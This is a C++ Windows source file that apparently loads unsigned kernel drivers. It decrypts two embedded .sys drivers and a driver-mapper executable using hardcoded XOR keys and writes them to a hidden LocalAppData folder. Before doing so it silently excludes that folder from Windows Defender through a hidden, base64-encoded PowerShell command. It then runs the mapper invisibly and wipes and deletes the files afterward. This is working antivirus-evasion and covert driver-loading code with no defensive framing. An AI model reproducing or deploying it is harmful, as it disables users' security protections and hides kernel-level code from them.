#include "driver_loader.hpp"
#include "whoswho_encrypted.h"
#include "sentinel_encrypted.h"
#include "windmapper_embedded.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <objbase.h>
#include <wincrypt.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <filesystem>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")

namespace
{
    static constexpr unsigned char WHOSWHO_KEY[] = {
        0xA3, 0x5F, 0x17, 0xD2, 0x8B, 0x64, 0xE9, 0x31,
        0xCC, 0x4A, 0x76, 0xF0, 0x0E, 0x93, 0xB8, 0x2D
    };

    static constexpr unsigned char SENTINEL_KEY[] = {
        0xD7, 0x2B, 0x83, 0x4E, 0xF1, 0x69, 0xA5, 0x1C,
        0x38, 0xE0, 0x54, 0x9F, 0x7A, 0xC6, 0x0D, 0xB2
    };

    static constexpr unsigned char MAPPER_KEY[] = {
        0x91, 0x3C, 0xAE, 0x57, 0xF8, 0x22, 0xD4, 0x6B,
        0x15, 0xC9, 0x83, 0x4F, 0xBA, 0x60, 0x7E, 0xE3
    };

    bool g_loaded = false;


    bool verify_blob_integrity(const unsigned char* data, unsigned long size,
                               unsigned long expected_size)
    {
        if (size != expected_size)
            return false;
        if (size < 2 || data[0] != 'M' || data[1] != 'Z')
            return false;


        if (size < 64)
            return false;
        uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
        if (e_lfanew >= size - 4)
            return false;

        if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
            data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
            return false;

        return true;
    }

    std::wstring get_stage_dir()
    {
        wchar_t* local = nullptr;
        if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, nullptr, &local)) || !local)
            return {};
        std::filesystem::path p(local);
        CoTaskMemFree(local);
        p /= L"AiDA";
        p /= L"Standalone";
        p /= L"stage";
        std::error_code ec;
        std::filesystem::create_directories(p, ec);
        if (ec)
            return {};
        return p.wstring();
    }

    std::wstring random_token(size_t bytes)
    {
        std::wstring out;
        unsigned char raw[32] = {};
        if (bytes > sizeof(raw))
            bytes = sizeof(raw);
        if (BCryptGenRandom(nullptr, raw, static_cast<ULONG>(bytes),
                            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
            return out;
        static const wchar_t* hex = L"0123456789abcdef";
        out.reserve(bytes * 2);
        for (size_t i = 0; i < bytes; ++i) {
            out.push_back(hex[(raw[i] >> 4) & 0xF]);
            out.push_back(hex[raw[i] & 0xF]);
        }
        return out;
    }

    std::wstring make_stage_path(const std::wstring& dir, const wchar_t* ext)
    {
        if (dir.empty())
            return {};
        std::wstring name = random_token(8);
        if (name.empty())
            return {};
        std::filesystem::path p = std::filesystem::path(dir) / (name + ext);
        return p.wstring();
    }

    std::wstring base64_encode_utf16(const std::wstring& s)
    {
        std::wstring out;
        if (s.empty())
            return out;
        DWORD bytes = static_cast<DWORD>(s.size() * sizeof(wchar_t));
        DWORD encoded = 0;
        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                  nullptr, &encoded) || encoded == 0)
            return out;
        out.resize(encoded);
        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                  &out[0], &encoded)) {
            out.clear();
            return out;
        }
        if (!out.empty() && out.back() == L'\0')
            out.pop_back();
        return out;
    }

    void register_defender_exclusion(const std::wstring& dir)
    {
        if (dir.empty())
            return;

        std::wstring quoted;
        quoted.reserve(dir.size() * 2 + 4);
        quoted.push_back(L'\'');
        for (wchar_t c : dir) {
            if (c == L'\'')
                quoted.push_back(L'\'');
            quoted.push_back(c);
        }
        quoted.push_back(L'\'');

        std::wstring script =
            L"$ErrorActionPreference='SilentlyContinue';"
            L"try{Add-MpPreference -ExclusionPath " + quoted + L" -Force}catch{};"
            L"try{Add-MpPreference -ExclusionProcess " + quoted + L" -Force}catch{}";

        std::wstring encoded = base64_encode_utf16(script);
        if (encoded.empty())
            return;

        wchar_t sysdir[MAX_PATH] = {};
        if (!GetSystemDirectoryW(sysdir, MAX_PATH))
            return;
        std::wstring exe = std::wstring(sysdir) + L"\\WindowsPowerShell\\v1.0\\powershell.exe";

        std::wstring cmdline = L"\"" + exe +
            L"\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " +
            encoded;

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessW(exe.c_str(), &cmdline[0], nullptr, nullptr, FALSE,
                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
            return;

        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    bool decrypt_and_write(const unsigned char* enc, unsigned long enc_size,
                           const unsigned char* key, size_t key_len,
                           const std::wstring& out_path)
    {
        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, enc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf)
            return false;

        for (unsigned long i = 0; i < enc_size; ++i)
            buf[i] = enc[i] ^ key[i % key_len];

        if (!verify_blob_integrity(buf, enc_size, enc_size)) {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, enc_size, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, enc_size);
        VirtualFree(buf, 0, MEM_RELEASE);

        return ok && written == enc_size;
    }

    bool write_embedded_mapper(const std::wstring& path)
    {
        if (path.empty())
            return false;

        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, g_windmapper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf)
            return false;

        for (unsigned long i = 0; i < g_windmapper_size; ++i)
            buf[i] = g_windmapper_data[i] ^ MAPPER_KEY[i % sizeof(MAPPER_KEY)];

        if (!verify_blob_integrity(buf, g_windmapper_size, g_windmapper_size)) {
            SecureZeroMemory(buf, g_windmapper_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, g_windmapper_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, g_windmapper_size, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, g_windmapper_size);
        VirtualFree(buf, 0, MEM_RELEASE);

        if (!ok || written != g_windmapper_size) {
            DeleteFileW(path.c_str());
            return false;
        }

        return true;
    }

    void secure_delete(const std::wstring& path)
    {
        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER size;
            if (GetFileSizeEx(hf, &size) && size.QuadPart > 0) {
                auto* zeros = static_cast<unsigned char*>(
                    VirtualAlloc(nullptr, static_cast<SIZE_T>(size.QuadPart),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
                if (zeros) {
                    DWORD written = 0;
                    WriteFile(hf, zeros, static_cast<DWORD>(size.QuadPart), &written, nullptr);
                    FlushFileBuffers(hf);
                    VirtualFree(zeros, 0, MEM_RELEASE);
                }
            }
            CloseHandle(hf);
        }
        DeleteFileW(path.c_str());
    }
}

namespace driver_loader
{
    bool is_driver_loaded()
    {
        return g_loaded;
    }

    bool initialize_and_load()
    {
        if (g_loaded)
            return true;

        std::wstring stage = get_stage_dir();
        if (stage.empty())
            return false;

        register_defender_exclusion(stage);

        std::wstring mapper_path = make_stage_path(stage, L".exe");
        std::wstring whoswho_path = make_stage_path(stage, L".sys");
        std::wstring sentinel_path = make_stage_path(stage, L".sys");
        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty())
            return false;

        if (!write_embedded_mapper(mapper_path))
            return false;

        if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
                               WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
            secure_delete(mapper_path);
            return false;
        }

        if (!decrypt_and_write(g_sentinel_encrypted, g_sentinel_encrypted_size,
                               SENTINEL_KEY, sizeof(SENTINEL_KEY), sentinel_path)) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            return false;
        }

        std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                               whoswho_path + L"\" \"" + sentinel_path + L"\"";

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        BOOL created = CreateProcessW(
            mapper_path.c_str(),
            &cmdline[0],
            nullptr, nullptr,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi);

        if (!created) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            secure_delete(sentinel_path);
            return false;
        }


        HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags =
                JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
                JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                    &jeli, sizeof(jeli));
            AssignProcessToJobObject(hJob, pi.hProcess);
        }

        ResumeThread(pi.hThread);

        WaitForSingleObject(pi.hProcess, 90000);

        DWORD exit_code = 1;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (hJob)
            CloseHandle(hJob);

        secure_delete(mapper_path);
        secure_delete(whoswho_path);
        secure_delete(sentinel_path);

        if (exit_code != 0)
            return false;

        g_loaded = true;
        return true;
    }
}
